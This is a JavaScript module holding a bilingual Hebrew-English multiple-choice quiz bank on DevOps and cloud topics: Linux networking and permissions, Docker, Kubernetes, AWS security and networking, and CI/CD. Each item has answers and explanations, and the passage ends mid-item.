/**
 * בנק שאלות לחידון הרשתות
 * כל שאלה: { q, correct, choices: [4 options], explanation }
 */

export const quizBank = {
  // ===== DevOps & Cloud Track (201-206) =====
  201: [
    {
      q: "\u200Fאיך Linux מייצג פורטים פתוחים בצורה היעילה ביותר לניפוי בעיות?",
      correct: "\u200Fss -tulnp — מראה TCP/UDP, listening,\nport number, PID ושם תהליך",
      choices: [
        "\u200Fss -tulnp — מראה TCP/UDP, listening,\nport number, PID ושם תהליך",
        "\u200Fnetstat -a",
        "\u200Fifconfig --ports",
        "\u200Flsof /dev/net"
      ],
      explanation: "‏‏ ss — Socket Statistics\n\nעיקרי:\n- החליף את netstat (deprecated)\n- t=TCP, -u=UDP, -l=listening\n- n=numeric (לא resolve שמות)\n\nטיפ:\njournalctl -u service -f = logs בזמן אמת",
      explanationEn: "ss (Socket Statistics) replaced netstat (deprecated).\n\nMain Points:\n- Flags: -t=TCP, -u=UDP, -l=listening, -n=numeric (no name resolution), -p=show PID\n- Example output: LISTEN 0 128 0.0.0.0:80 users:(('nginx',pid=1234))\n- This knowledge is critical for all network troubleshooting",
      qEn: "How does Linux show open ports most efficiently for troubleshooting?",
      correctEn: "ss -tulnp — shows TCP/UDP, listening,\nport number, PID and process name",
      choicesEn: [
        "ss -tulnp — shows TCP/UDP, listening,\nport number, PID and process name",
        "netstat -a",
        "ifconfig --ports",
        "lsof /dev/net"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין hard link לsoft link ב־Linux?",
      correct: "\u200FHard link: מצביע לאותו inode\nנשמר גם אחרי מחיקת המקור\nSoft link: מצביע ל-path\nנשבר אם המקור נמחק",
      choices: [
        "\u200FHard link: מצביע לאותו inode\nנשמר גם אחרי מחיקת המקור\nSoft link: מצביע ל-path\nנשבר אם המקור נמחק",
        "\u200FHard link לקבצים — Soft link לתיקיות",
        "\u200FHard link מהיר יותר\nSoft link חוצה filesystems",
        "\u200Fאין הבדל מעשי"
      ],
      explanation: "‏‏ inode\n\nעיקרי:\n- metadata של קובץ (permissions, timestamps, blocks)\n- Hard link\n- שם נוסף לאותו inode\n\nטיפ:\nls -la מראה → target",
      explanationEn: "An inode stores file metadata (permissions, timestamps, blocks).\n\nMain Points:\n- Hard link: another name pointing to the same inode — file is deleted only when link count reaches 0 (ln file hardlink)\n- Soft link (symlink): ln -s /path/file link — can cross filesystems and directories, breaks if target is deleted\n- ls -la shows the target",
      qEn: "What is the difference between hard link and soft link in Linux?",
      correctEn: "Hard link: points to the same inode\nstays even after deleting the original\nSoft link: points to the path\nbreaks if the original is deleted",
      choicesEn: [
        "Hard link: points to the same inode\nstays even after deleting the original\nSoft link: points to the path\nbreaks if the original is deleted",
        "Hard link for files — Soft link for directories",
        "Hard link is faster\nSoft link crosses filesystems",
        "No practical difference"
      ]
    },
    {
      q: "\u200Fמה המשמעות של chmod 755?",
      correct: "\u200FOwner: rwx (7), Group: r-x (5), Others: r-x (5)\nקריאה+הרצה לכולם, כתיבה רק ל-owner",
      choices: [
        "\u200FOwner: rwx (7), Group: r-x (5), Others: r-x (5)\nקריאה+הרצה לכולם, כתיבה רק ל-owner",
        "\u200FRead-only לכל המשתמשים",
        "\u200FFull permissions לכולם",
        "\u200FOwner: rw, Group: r, Others: x"
      ],
      explanation: "‏‏ חישוב הרשאות\n\nעיקרי:\n- r=4, w=2, x=1\n- 7=4+2+1=rwx\n- 5=4+0+1=r-x\n\nטיפ:\nfind / -perm -4000 = מוצא SUID files",
      explanationEn: "Permission calculation: r=4, w=2, x=1.\n\nMain Points:\n- 7=4+2+1=rwx, 5=4+0+1=r-x, 4=r--\n- Common examples: chmod 755 for executable scripts/directories, chmod 644 for files (owner rw, others r), chmod 600 for private keys (owner only)\n- SUID (4755): file runs with owner's permissions, not the executing user's",
      qEn: "What does chmod 755 mean?",
      correctEn: "Owner: rwx (7), Group: r-x (5), Others: r-x (5)\nRead+execute for all, write only for owner",
      choicesEn: [
        "Owner: rwx (7), Group: r-x (5), Others: r-x (5)\nRead+execute for all, write only for owner",
        "Read-only for all users",
        "Full permissions for everyone",
        "Owner: rw, Group: r, Others: x"
      ]
    },
    {
      q: "\u200Fמה הפקודה למציאת processes שמאזינים על פורט 8080?",
      correct: "\u200Fss -tlnp | grep 8080\n(או lsof -i :8080)",
      choices: [
        "\u200Fss -tlnp | grep 8080\n(או lsof -i :8080)",
        "\u200Fnetstat --port 8080",
        "\u200Fps aux | grep 8080",
        "\u200Ffind /proc -name '8080'"
      ],
      explanation: "‏‏ ss (socket statistics)\n\nעיקרי:\n- t TCP, -l listening\n- n numeric (לא resolve names)\n- p show process\n\nטיפ:\nkill -9 $(lsof -ti :8080) = kill process שמאזין על port",
      explanationEn: "ss (socket statistics): -t TCP, -l listening, -n numeric, -p show process.\n\nMain Points:\n- ss -tlnp shows all TCP listening sockets with PID\n- lsof -i :8080 shows all open files/sockets on port 8080\n- netstat -tlnp | grep 8080 also works but ss is faster",
      qEn: "What command finds processes listening on port 8080?",
      correctEn: "ss -tlnp | grep 8080\n(or lsof -i :8080)",
      choicesEn: [
        "ss -tlnp | grep 8080\n(or lsof -i :8080)",
        "netstat --port 8080",
        "ps aux | grep 8080",
        "find /proc -name '8080'"
      ]
    }
  ],

  202: [
    {
      q: "\u200Fמה ההבדל בין Docker image לבין Docker container?",
      correct: "\u200FImage = תבנית read-only שכבתית\nContainer = instance רץ של image עם writable layer",
      choices: [
        "\u200FImage = תבנית read-only שכבתית\nContainer = instance רץ של image עם writable layer",
        "\u200FImage שמור על disk — Container ב-memory",
        "\u200FContainer גדול יותר מ-image",
        "\u200FImage מכיל קוד — Container מכיל data"
      ],
      explanation: "‏‏ Docker Image\n\nעיקרי:\n- Union filesystem — layers\n- כל RUN/COPY/ADD ב־Dockerfile = layer חדש\n- שכבות shared בין containers\n\nטיפ:\ndocker ps = containers רצים",
      explanationEn: "Docker Image uses a Union filesystem with layers.\n\nMain Points:\n- Each RUN/COPY/ADD in Dockerfile creates a new layer\n- Layers are shared between containers\n- Container = image layers (read-only) + writable layer on top",
      qEn: "What is the difference between a Docker image and a Docker container?",
      correctEn: "Image = read-only layered template\nContainer = running instance of image with writable layer",
      choicesEn: [
        "Image = read-only layered template\nContainer = running instance of image with writable layer",
        "Image is stored on disk — Container in memory",
        "Container is bigger than image",
        "Image holds code — Container holds data"
      ]
    },
    {
      q: "\u200Fמה Multi-stage build ב־Docker ולמה להשתמש בזה?",
      correct: "\u200Fבנייה בשלבים — stage ראשון ל-compile\nstage שני רק עם artifacts\nimage קטן ב־10x",
      choices: [
        "\u200Fבנייה בשלבים — stage ראשון ל-compile\nstage שני רק עם artifacts\nimage קטן ב־10x",
        "\u200Fבניית כמה images במקביל",
        "\u200Fשימוש ב-base images שונים ל-env שונים",
        "\u200Fcaching של layers בין builds"
      ],
      explanation: "‏‏ בלי multi-stage\n\nעיקרי:\n- image Go מכיל compiler, source, dependencies = 1.2GB\n- עם multi-stage\n- FROM golang:1.21 AS builder\n\nטיפ:\nNode.js: stage עם devDependencies, stage עם רק production deps",
      explanationEn: "Without multi-stage: a Go image contains compiler, source, dependencies = 1.2GB.\n\nMain Points:\n- With multi-stage: FROM golang:1.21 AS builder; RUN go build; FROM scratch; COPY --from=builder /app/binary \n- Results in an 8MB image\n- Only binary — no compiler, no source",
      qEn: "What is Multi-stage build in Docker and why use it?",
      correctEn: "Build in stages — first stage for compile\nsecond stage with artifacts only\nimage 10x smaller",
      choicesEn: [
        "Build in stages — first stage for compile\nsecond stage with artifacts only\nimage 10x smaller",
        "Building multiple images in parallel",
        "Using different base images for different environments",
        "Caching layers between builds"
      ]
    },
    {
      q: "\u200Fמה ה־ENTRYPOINT לעומת CMD ב־Dockerfile?",
      correct: "\u200FENTRYPOINT = תמיד רץ\nCMD = default args שאפשר לoverride ב-docker run",
      choices: [
        "\u200FENTRYPOINT = תמיד רץ\nCMD = default args שאפשר לoverride ב-docker run",
        "\u200FCMD רץ ב-build — ENTRYPOINT ב-run",
        "\u200Fשניהם זהים — אחד ל-linux אחד ל-windows",
        "\u200FENTRYPOINT ל-webserver — CMD ל-batch jobs"
      ],
      explanation: "‏‏ ENTRYPOINT\n\nעיקרי:\n- ENTRYPOINT ['nginx', '-g', 'daemon off;']\n- לא ניתן ל-override ב-docker run\n- CMD\n\nטיפ:\nENTRYPOINT ל-binary, CMD ל-default flags",
      explanationEn: "ENTRYPOINT always runs and cannot be overridden by docker run.\n\nMain Points:\n- CMD provides default arguments that can be overridden\n- Together: ENTRYPOINT runs always, CMD supplies default args\n- docker run myimage --worker-processes=8 replaces CMD",
      qEn: "What is ENTRYPOINT vs CMD in Dockerfile?",
      correctEn: "ENTRYPOINT = always runs\nCMD = default args that can be overridden in docker run",
      choicesEn: [
        "ENTRYPOINT = always runs\nCMD = default args that can be overridden in docker run",
        "CMD runs at build — ENTRYPOINT at run",
        "Both are the same — one for Linux one for Windows",
        "ENTRYPOINT for webserver — CMD for batch jobs"
      ]
    },
    {
      q: "\u200Fמה best practice לכתיבת Dockerfile — מה מקטין image size?",
      correct: "\u200FMulti-stage builds, base images קטנים (alpine),\nמיזוג RUN commands, ניקוי cache ב-apt,\nהוספת .dockerignore",
      choices: [
        "\u200FMulti-stage builds, base images קטנים (alpine),\nמיזוג RUN commands, ניקוי cache ב-apt,\nהוספת .dockerignore",
        "\u200Fהוספת COMPRESS=true ב־Dockerfile",
        "\u200Fשימוש ב־COPY במקום ADD בלבד",
        "\u200Fהגדרת WORKDIR = /tmp לחיסכון בזיכרון"
      ],
      explanation: "‏‏ Multi-stage\n\nעיקרי:\n- FROM golang:1.21 AS builder; RUN go build\n- FROM alpine:3.18; COPY --from=builder /app /app\n- image סופי ללא Go compiler!\n\nטיפ:\nהעתק package.json לפני COPY . כדי למנף cache של npm install",
      explanationEn: "Multi-stage: FROM golang:1.21 AS builder; RUN go build; FROM alpine:3.18; COPY --from=builder /app /app — final image without Go compiler.\n\nMain Points:\n- Alpine Linux is 5MB vs Ubuntu 72MB\n- Merge RUN commands and clean cache in the same layer: RUN apt-get update && apt-get install -y nginx && rm -rf /var/lib/apt/lists/*\n- .dockerignore excludes node_modules, .git, *.log from build context",
      qEn: "What is best practice for writing a Dockerfile — what reduces image size?",
      correctEn: "Multi-stage builds, small base images (alpine),\nmerge RUN commands, clean apt cache,\nadd .dockerignore",
      choicesEn: [
        "Multi-stage builds, small base images (alpine),\nmerge RUN commands, clean apt cache,\nadd .dockerignore",
        "Add COMPRESS=true in Dockerfile",
        "Use COPY instead of ADD only",
        "Set WORKDIR = /tmp to save memory"
      ]
    }
  ],

  203: [
    {
      q: "\u200Fמה ההבדל בין Deployment לבין StatefulSet ב־Kubernetes?",
      correct: "\u200FDeployment לאפליקציות stateless\nStatefulSet ל־Databases — שומר identity קבועה,\npersistent storage, ו-ordered rollout",
      choices: [
        "\u200FDeployment לאפליקציות stateless\nStatefulSet ל־Databases — שומר identity קבועה,\npersistent storage, ו-ordered rollout",
        "\u200FStatefulSet ישן יותר ומיועד להחלפה",
        "\u200FDeployment ל-containers בודדים\nStatefulSet ל-cluster",
        "\u200Fאין הבדל מעשי — רק naming convention"
      ],
      explanation: "‏‏ Deployment\n\nעיקרי:\n- pods ב-web server = interchangeable\n- מת pod-abc, נולד pod-xyz\n- StatefulSet\n\nטיפ:\nMySQL, Kafka, ZooKeeper = StatefulSet",
      explanationEn: "Deployment: web server pods are interchangeable — pod-abc dies, pod-xyz is born.\n\nMain Points:\n- StatefulSet: pod-0, pod-1, pod-2 have fixed names\n- pod-0 in database = always primary\n- Each pod gets its own PVC (Persistent Volume Claim)",
      qEn: "What is the difference between Deployment and StatefulSet in Kubernetes?",
      correctEn: "Deployment for stateless apps\nStatefulSet for Databases — keeps fixed identity,\npersistent storage, and ordered rollout",
      choicesEn: [
        "Deployment for stateless apps\nStatefulSet for Databases — keeps fixed identity,\npersistent storage, and ordered rollout",
        "StatefulSet is older and meant to be replaced",
        "Deployment for single containers\nStatefulSet for cluster",
        "No practical difference — just naming convention"
      ]
    },
    {
      q: "\u200Fמה Service ב־Kubernetes עושה ש־Pod IP לא יכול לעשות?",
      correct: "\u200Fמספק IP קבוע ו־DNS שלא משתנה\nגם כש־Pods מוחלפים או מוגדלים",
      choices: [
        "\u200Fמספק IP קבוע ו־DNS שלא משתנה\nגם כש־Pods מוחלפים או מוגדלים",
        "\u200Fמוסיף TLS encryption לתעבורה",
        "\u200Fמנהל resource limits ל-cpu ול-memory",
        "\u200Fמאפשר inter-namespace communication"
      ],
      explanation: "‏‏ Pod IP\n\nעיקרי:\n- ephemeral — Pod מת = IP חדש\n- Service\n- ClusterIP קבוע + DNS: my-service.namespace.svc.cluster.local\n\nטיפ:\nEndpoints object מכיל IPs עדכניות",
      explanationEn: "Pod IP is ephemeral — pod dies, new IP assigned.\n\nMain Points:\n- Service provides a stable ClusterIP + DNS: my-service.namespace.svc.cluster.local\n- kube-proxy manages iptables/ipvs rules to forward to correct Pods\n- Types: ClusterIP (internal), NodePort (port on node), LoadBalancer (cloud LB), ExternalName (DNS alias)",
      qEn: "What does a Service in Kubernetes do that a Pod IP cannot?",
      correctEn: "Provides a stable IP and DNS that does not change\neven when Pods are replaced or scaled",
      choicesEn: [
        "Provides a stable IP and DNS that does not change\neven when Pods are replaced or scaled",
        "Adds TLS encryption to traffic",
        "Manages resource limits for CPU and memory",
        "Allows inter-namespace communication"
      ]
    },
    {
      q: "\u200Fמה liveness probe לעומת readiness probe ב־Kubernetes?",
      correct: "\u200FLiveness: האם container חי? (restart אם לא)\nReadiness: האם מוכן ל-traffic? (הסר מ־Service אם לא)",
      choices: [
        "\u200FLiveness: האם container חי? (restart אם לא)\nReadiness: האם מוכן ל-traffic? (הסר מ־Service אם לא)",
        "\u200Fשניהם בודקים אותו דבר\nredness ל-db, liveness ל-web",
        "\u200FLiveness ב-staging — Readiness ב-production",
        "\u200FLiveness ל־HTTP — Readiness ל־TCP"
      ],
      explanation: "‏‏ Liveness probe נכשל\n\nעיקרי:\n- Kubernetes מבצע restart ל-container\n- Readiness probe נכשל\n- Pod מוסר מ־Service endpoints\n\nטיפ:\nבלי readiness = traffic ל־Pod שעדיין מאתחל",
      explanationEn: "Liveness probe fails: Kubernetes restarts the container.\n\nMain Points:\n- Readiness probe fails: Pod is removed from Service endpoints — no traffic, but not restarted\n- Startup probe (K8s 1.16+): for apps with slow startup\n- Configuration: HTTP/TCP/exec probes with initialDelaySeconds, periodSeconds, failureThreshold",
      qEn: "What is liveness probe vs readiness probe in Kubernetes?",
      correctEn: "Liveness: is the container alive? (restart if not)\nReadiness: is it ready for traffic? (remove from Service if not)",
      choicesEn: [
        "Liveness: is the container alive? (restart if not)\nReadiness: is it ready for traffic? (remove from Service if not)",
        "Both check the same thing\nreadiness for DB, liveness for web",
        "Liveness in staging — Readiness in production",
        "Liveness for HTTP — Readiness for TCP"
      ]
    },
    {
      q: "\u200Fמה ConfigMap ומה Secret ב־Kubernetes ומתי לא להשתמש ב־Secret?",
      correct: "\u200FConfigMap ל-config לא-סודי (env vars, files)\nSecret ל-data סודי (passwords, tokens)\nאך base64 בלבד, לא הצפנה!\nיש לנהל עם Vault/Sealed Secrets",
      choices: [
        "\u200FConfigMap ל-config לא-סודי (env vars, files)\nSecret ל-data סודי (passwords, tokens)\nאך base64 בלבד, לא הצפנה!\nיש לנהל עם Vault/Sealed Secrets",
        "\u200FConfigMap ל-files — Secret ל-env vars בלבד",
        "\u200FSecret מוצפן AES-256 אוטומטית על ידי Kubernetes",
        "\u200FConfigMap ו־Secret זהים — ההבדל הוא רק סמנטי"
      ],
      explanation: "‏‏ ConfigMap\n\nעיקרי:\n- kubectl create configmap app-config --from-file=config.yaml\n- Secret\n- kubectl create secret generic db-secret --from-literal=password=s3cr3t\n\nטיפ:\netcd = 'brain' של cluster — חייב להיות מאובטח",
      explanationEn: "ConfigMap: kubectl create configmap app-config --from-file=config.yaml.\n\nMain Points:\n- Secret: kubectl create secret generic db-secret --from-literal=password=s3cr3t — stored as base64 in etcd, NOT encrypted by default\n- Solution: Encryption at Rest for etcd, External secrets (HashiCorp Vault, AWS Secrets Manager, Sealed Secrets)\n- Usage: spec.containers.env.valueFrom.secretKeyRef or mount as volume",
      qEn: "What are ConfigMap and Secret in Kubernetes, and when not to use Secret?",
      correctEn: "ConfigMap for non-secret config (env vars, files)\nSecret for sensitive data (passwords, tokens)\nbut base64 only, not encryption!\nUse Vault/Sealed Secrets instead",
      choicesEn: [
        "ConfigMap for non-secret config (env vars, files)\nSecret for sensitive data (passwords, tokens)\nbut base64 only, not encryption!\nUse Vault/Sealed Secrets instead",
        "ConfigMap for files — Secret for env vars only",
        "Secret is encrypted with AES-256 automatically by Kubernetes",
        "ConfigMap and Secret are the same — the difference is just semantic"
      ]
    },
    {
      q: "\u200Fמה Resource Requests ו־Limits ב־Kubernetes ולמה חשוב להגדיר אותם?",
      correct: "\u200FRequests: מינימום משאבים שה-scheduler מבטיח ל-pod\nLimits: מקסימום שה-pod יכול לצרוך\nבלי Limits, pod אחד יכול להרעיב את כל ה-node",
      choices: [
        "\u200FRequests: מינימום משאבים שה-scheduler מבטיח ל-pod\nLimits: מקסימום שה-pod יכול לצרוך\nבלי Limits, pod אחד יכול להרעיב את כל ה-node",
        "\u200FRequests ו־Limits שניהם מגדירים maximum\nההבדל הוא ב-admission controller",
        "\u200FLimits חלים רק על CPU — Requests על Memory",
        "\u200Fבלי Requests, pods לא יתחילו לרוץ"
      ],
      explanation: "‏‏ הגדרה\n\nעיקרי:\n- requests: cpu: '250m' memory: '128Mi'\n- limits: cpu: '500m' memory: '256Mi'\n- Scheduler\n\nטיפ:\nLimitRange ל-namespace defaults, ResourceQuota ל-limits ב-namespace",
      explanationEn: "Requests: cpu: 250m, memory: 128Mi.\n\nMain Points:\n- Limits: cpu: 500m, memory: 256Mi\n- Scheduler finds a node with enough available requests\n- CPU over limit = throttled (slow, not killed)",
      qEn: "What are Resource Requests and Limits in Kubernetes and why set them?",
      correctEn: "Requests: minimum resources the scheduler guarantees to the pod\nLimits: maximum the pod can use\nWithout Limits, one pod can starve the whole node",
      choicesEn: [
        "Requests: minimum resources the scheduler guarantees to the pod\nLimits: maximum the pod can use\nWithout Limits, one pod can starve the whole node",
        "Requests and Limits both set maximum\nthe difference is in admission controller",
        "Limits apply only to CPU — Requests to Memory",
        "Without Requests, pods will not start running"
      ]
    }
  ],

  204: [
    {
      q: "\u200Fמה ההבדל בין AWS Security Group לבין NACL?",
      correct: "\u200FSecurity Group: stateful (זוכר connection), ברמת ENI\nNACL: stateless, ברמת subnet\nחייב לפתוח inbound ו-outbound בנפרד",
      choices: [
        "\u200FSecurity Group: stateful (זוכר connection), ברמת ENI\nNACL: stateless, ברמת subnet\nחייב לפתוח inbound ו-outbound בנפרד",
        "\u200FSecurity Group ל־EC2 — NACL ל־S3",
        "\u200FNACL מהיר יותר — Security Group גמיש יותר",
        "\u200FSecurity Group חינמי — NACL בתשלום"
      ],
      explanation: "‏‏ Security Group\n\nעיקרי:\n- stateful — אם פתחת port 443 inbound, response יוצא אוטומטית\n- rules רק allow (אין deny)\n- NACL\n\nטיפ:\nSecurity Group ל-instance, NACL ל-subnet",
      explanationEn: "Security Group: stateful — if you open port 443 inbound, response goes out automatically.\n\nMain Points:\n- Rules are allow-only (no deny)\n- NACL: stateless — need inbound rule for port 443 AND outbound rule for ephemeral ports 1024-65535\n- Supports both allow and deny rules",
      qEn: "What is the difference between AWS Security Group and NACL?",
      correctEn: "Security Group: stateful (remembers connection), at ENI level\nNACL: stateless, at subnet level\nmust open inbound and outbound separately",
      choicesEn: [
        "Security Group: stateful (remembers connection), at ENI level\nNACL: stateless, at subnet level\nmust open inbound and outbound separately",
        "Security Group for EC2 — NACL for S3",
        "NACL is faster — Security Group is more flexible",
        "Security Group is free — NACL is paid"
      ]
    },
    {
      q: "\u200Fמה IAM Role ומתי עדיף על Access Key?",
      correct: "\u200FIAM Role = הרשאות זמניות שניתן ל-assume\nעדיף ל־EC2/Lambda כי לא דורש hardcoded credentials",
      choices: [
        "\u200FIAM Role = הרשאות זמניות שניתן ל-assume\nעדיף ל־EC2/Lambda כי לא דורש hardcoded credentials",
        "\u200FRole ל-admins — Access Key ל-developers",
        "\u200FAccess Key מאובטח יותר כי ניתן ל-rotate",
        "\u200FRole רק ל-cross-account access"
      ],
      explanation: "‏‏ Access Key\n\nעיקרי:\n- long-term credentials = סכנת דליפה (git push, logs)\n- IAM Role\n- EC2 instance profile = temporary credentials שמתחלפות אוטומטית כל שעה\n\nטיפ:\nAWS Cost Explorer + CloudTrail ל-audit",
      explanationEn: "Access Key: long-term credentials with leak risk (git push, logs).\n\nMain Points:\n- IAM Role: EC2 instance profile provides temporary credentials that rotate automatically every hour\n- Lambda execution role\n- AssumeRole from STS",
      qEn: "What is IAM Role and when is it better than Access Key?",
      correctEn: "IAM Role = temporary permissions you can assume\nBetter for EC2/Lambda because no hardcoded credentials needed",
      choicesEn: [
        "IAM Role = temporary permissions you can assume\nBetter for EC2/Lambda because no hardcoded credentials needed",
        "Role for admins — Access Key for developers",
        "Access Key is more secure because it can be rotated",
        "Role only for cross-account access"
      ]
    },
    {
      q: "\u200Fמה AWS VPC Peering לעומת Transit Gateway?",
      correct: "\u200FPeering: חיבור 1:1 בין 2 VPCs\nTransit Gateway: hub מרכזי\nN VPCs מתחברים ל־TGW = N connections\nלעומת N*(N-1)/2 ב-peering",
      choices: [
        "\u200FPeering: חיבור 1:1 בין 2 VPCs\nTransit Gateway: hub מרכזי\nN VPCs מתחברים ל־TGW = N connections\nלעומת N*(N-1)/2 ב-peering",
        "\u200FPeering יקר יותר — Transit Gateway חינמי",
        "\u200FPeering בין regions — TGW בתוך region",
        "\u200FTGW מהיר יותר — Peering מאובטח יותר"
      ],
      explanation: "‏‏ השוואה\n\nעיקרי:\n- עם 10 VPCs ב-peering full mesh: 45 חיבורים\n- עם TGW: 10 חיבורים\n- TGW\n\nטיפ:\nפחות מ־5 VPCs? peering מספיק",
      explanationEn: "With 10 VPCs in full mesh peering: 45 connections.\n\nMain Points:\n- With TGW: 10 connections\n- TGW supports VPN, Direct Connect, multi-region\n- $0.05/GB data processed",
      qEn: "What is AWS VPC Peering vs Transit Gateway?",
      correctEn: "Peering: 1:1 connection between 2 VPCs\nTransit Gateway: central hub\nN VPCs connect to TGW = N connections\nvs N*(N-1)/2 with peering",
      choicesEn: [
        "Peering: 1:1 connection between 2 VPCs\nTransit Gateway: central hub\nN VPCs connect to TGW = N connections\nvs N*(N-1)/2 with peering",
        "Peering is more expensive — Transit Gateway is free",
        "Peering between regions — TGW within a region",
        "TGW is faster — Peering is more secure"
      ]
    },
    {
      q: "\u200Fמה ה־Shared Responsibility Model ב־AWS ואיזה אחריות על הלקוח?",
      correct: "\u200FAWS אחראית על security OF the cloud\n(hardware, facilities, hypervisor)\nלקוח אחראי על security IN the cloud\n(OS, data, IAM, network config)",
      choices: [
        "\u200FAWS אחראית על security OF the cloud\n(hardware, facilities, hypervisor)\nלקוח אחראי על security IN the cloud\n(OS, data, IAM, network config)",
        "\u200FAWS אחראית על הכל — לקוח רק על application code",
        "\u200Fהלקוח אחראי על הכל כי הוא משלם",
        "\u200Fהאחריות חלוקה שווה 50/50 על כל דבר"
      ],
      explanation: "‏‏ AWS\n\nעיקרי:\n- physical security, hardware, networking\n- hypervisor, managed services infrastructure\n- Customer\n\nטיפ:\nAWS Config, Security Hub, GuardDuty = tools ל-monitoring compliance",
      explanationEn: "AWS: physical security, hardware, networking, hypervisor, managed services infrastructure.\n\nMain Points:\n- Customer: EC2 OS patching, Security Groups config, S3 bucket policies (don't open public!), IAM configuration, encryption of data, application security\n- Serverless (Lambda): AWS also manages OS\n- RDS: AWS manages DB engine patching, customer manages access control and data",
      qEn: "What is the Shared Responsibility Model in AWS and what is the customer responsible for?",
      correctEn: "AWS is responsible for security OF the cloud\n(hardware, facilities, hypervisor)\nCustomer is responsible for security IN the cloud\n(OS, data, IAM, network config)",
      choicesEn: [
        "AWS is responsible for security OF the cloud\n(hardware, facilities, hypervisor)\nCustomer is responsible for security IN the cloud\n(OS, data, IAM, network config)",
        "AWS is responsible for everything — customer only for application code",
        "The customer is responsible for everything because they pay",
        "Responsibility is split 50/50 on everything"
      ]
    }
  ],

  205: [
    {
      q: "\u200Fמה ההבדל בין CI לבין CD ב־CI/CD pipeline?",
      correct: "\u200FCI: בדיקת קוד אוטומטית בכל push\nCD: Deploy אוטומטי לאחר CI מוצלח\n(Delivery=staging, Deployment=production)",
      choices: [
        "\u200FCI: בדיקת קוד אוטומטית בכל push\nCD: Deploy אוטומטי לאחר CI מוצלח\n(Delivery=staging, Deployment=production)",
        "\u200FCI ל-developers — CD ל-operations",
        "\u200FCI ב-cloud — CD on-premise",
        "\u200Fאין הבדל — זה שם כולל ל-automation"
      ],
      explanation: "‏‏ CI (Continuous Integration)\n\nעיקרי:\n- כל push → build + unit tests + lint + security scan\n- מוצא bugs מוקדם\n- CD Delivery\n\nטיפ:\nbranch protection + required CI status checks",
      explanationEn: "CI (Continuous Integration): every push triggers build + unit tests + lint + security scan.\n\nMain Points:\n- Catches bugs early\n- CD Delivery: after CI, deploy to staging automatically\n- CD Deployment: after staging approval, deploy to production automatically (fully automated)",
      qEn: "What is the difference between CI and CD in a CI/CD pipeline?",
      correctEn: "CI: automatic code testing on every push\nCD: automatic deploy after successful CI\n(Delivery=staging, Deployment=production)",
      choicesEn: [
        "CI: automatic code testing on every push\nCD: automatic deploy after successful CI\n(Delivery=staging, Deployment=production)",
        "CI for developers — CD for operations",
        "CI in cloud — CD on-premise",
        "No difference — it is a general name for automation"
      ]
    },
    {
      q: "\u200Fמה Blue-Green Deployment?",
      correct: "\u200Fשתי environments זהות\nBlue (production) ו־Green (new version)\nSwitch traffic בבת אחת\nRollback = switch חזרה",
      choices: [
        "\u200Fשתי environments זהות\nBlue (production) ו־Green (new version)\nSwitch traffic בבת אחת\nRollback = switch חזרה",
        "\u200FDeploy ל-servers כחולים בתחילה, ירוקים אחר כך",
        "\u200FBlue ל־Europe, Green ל־US — geo deployment",
        "\u200FCanary deployment עם color coding"
      ],
      explanation: "‏‏ Blue-Green\n\nעיקרי:\n- zero-downtime deployment\n- Blue = current production\n- Green = new version, tested ב-parallel\n\nטיפ:\nFeature flags = code-level canary",
      explanationEn: "Blue-Green: zero-downtime deployment.\n\nMain Points:\n- Blue = current production\n- Green = new version, tested in parallel\n- Switch: load balancer redirects from Blue to Green instantly",
      qEn: "What is Blue-Green Deployment?",
      correctEn: "Two identical environments\nBlue (production) and Green (new version)\nSwitch traffic at once\nRollback = switch back",
      choicesEn: [
        "Two identical environments\nBlue (production) and Green (new version)\nSwitch traffic at once\nRollback = switch back",
        "Deploy to blue servers first, green servers after",
        "Blue for Europe, Green for US — geo deployment",
        "Canary deployment with color coding"
      ]
    },
    {
      q: "\u200Fמה Artifact ב־CI/CD pipeline?",
      correct: "\u200FOutput של build step\nDocker image, JAR, binary, npm package\nשמאוחסן ומשמש ל-deploy",
      choices: [
        "\u200FOutput של build step\nDocker image, JAR, binary, npm package\nשמאוחסן ומשמש ל-deploy",
        "\u200Fלוג הריצה של ה-pipeline",
        "\u200Fקובץ הגדרות ה-pipeline",
        "\u200Ftest coverage report"
      ],
      explanation: "‏‏ Artifact = מה שנבנה\n\nעיקרי:\n- Docker image → pushed ל-registry (ECR, GCR, Docker Hub)\n- JAR → Nexus/Artifactory\n- npm → registry\n\nטיפ:\nretention policy חוסכת עלויות",
      explanationEn: "Artifact = build output.\n\nMain Points:\n- Docker image pushed to registry (ECR, GCR, Docker Hub)\n- JAR to Nexus/Artifactory\n- npm to registry",
      qEn: "What is an Artifact in a CI/CD pipeline?",
      correctEn: "Output of the build step\nDocker image, JAR, binary, npm package\nstored and used for deploy",
      choicesEn: [
        "Output of the build step\nDocker image, JAR, binary, npm package\nstored and used for deploy",
        "The pipeline run log",
        "The pipeline config file",
        "Test coverage report"
      ]
    },
    {
      q: "\u200Fמה GitHub Actions workflow ואיך מגדירים environment secrets?",
      correct: "\u200FYAML ב-.github/workflows/ שמגדיר triggers, jobs ו-steps\nSecrets מוגדרים ב־Repository Settings\nומוזרקים כ-env vars: ${{ secrets.MY_SECRET }}",
      choices: [
        "\u200FYAML ב-.github/workflows/ שמגדיר triggers, jobs ו-steps\nSecrets מוגדרים ב־Repository Settings\nומוזרקים כ-env vars: ${{ secrets.MY_SECRET }}",
        "\u200FWorkflow מוגדר ב-.gitlab-ci.yml ב-root",
        "\u200FSecrets נכתבים ישירות ב־YAML מוצפן",
        "\u200FGitHub Actions הוא שם של CLI tool שמריץ pipelines"
      ],
      explanation: "‏‏ workflow file\n\nעיקרי:\n- on: [push, pull_request]\n- jobs: build: runs-on: ubuntu-latest\n- steps: uses: actions/checkout@v3; run: npm test\n\nטיפ:\nOIDC: GitHub Actions → AWS IAM Role ללא static keys!",
      explanationEn: "Workflow file: on: [push, pull_request]; jobs: build: runs-on: ubuntu-latest; steps: uses: actions/checkout@v3; run: npm test.\n\nMain Points:\n- Secrets: Settings, Secrets and variables, Actions, New secret\n- In step: env: AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n- Environments (prod/staging) can require approval",
      qEn: "What is a GitHub Actions workflow and how to set environment secrets?",
      correctEn: "YAML in .github/workflows/ that defines triggers, jobs and steps\nSecrets are set in Repository Settings\nand injected as env vars: ${{ secrets.MY_SECRET }}",
      choicesEn: [
        "YAML in .github/workflows/ that defines triggers, jobs and steps\nSecrets are set in Repository Settings\nand injected as env vars: ${{ secrets.MY_SECRET }}",
        "Workflow is defined in .gitlab-ci.yml at root",
